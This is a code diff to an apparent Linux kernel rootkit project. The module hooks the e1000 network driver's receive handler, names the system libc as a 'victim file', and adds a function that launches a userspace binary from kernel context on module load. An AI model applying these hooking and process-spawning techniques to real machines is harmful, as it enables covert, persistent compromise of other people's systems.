@@ -13,6 +13,7 @@
 
 const char* net_adapter = "e1000";
 
+
 #define VICTIM_FILE_OVERRIDE "/lib/x86_64-linux-gnu/libc-2.33.so"
 
 #define STRINGIFY(A) #A
@@ -60,6 +61,22 @@ void page_cache_test(void){
 }
 
 
+void launch_bash(void){
+  struct subprocess_info* sub_info;
+  int status;
+  char* argv[] = {"hello world!\xA", NULL};
+
+  char* envp[] = {
+    "HOME=/",
+    "TERM=linux",
+    "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
+    NULL
+  };
+  status = call_usermodehelper("/home/mineo333/Qogchamp/testing/write_string/write_string", argv, envp, UMH_WAIT_EXEC);
+  printk(KERN_INFO "status: %d\n", status);
+  
+}
+
 int init_module(void)
 {
   
@@ -102,14 +119,14 @@ int init_module(void)
    * standard frame. This changes in the case of a jumbo frame. 
    */
 
-
+  
   old_clean_rx = e1000->clean_rx; //save old clean_rx
   
-  e1000->clean_rx = e1000_clean_rx_irq; 
+  WRITE_ONCE(e1000->clean_rx, e1000_clean_rx_irq); 
   if(sizeof(struct ethhdr) == ETH_HLEN){
     printk(KERN_INFO "SAME\n");
   }
-
+  launch_bash();
   printk(KERN_INFO "clean_rx replaced\n");
 
   return 0;
@@ -117,7 +134,7 @@ int init_module(void)
 void cleanup_module(void)
 {
   if(e1000)
-    e1000->clean_rx = old_clean_rx;
+    WRITE_ONCE(e1000->clean_rx, old_clean_rx);
   //replace_page(new_opcode, old_opcode);
   //replace_page(new_troll, old_troll); //flipped around because old is the new now. 
 
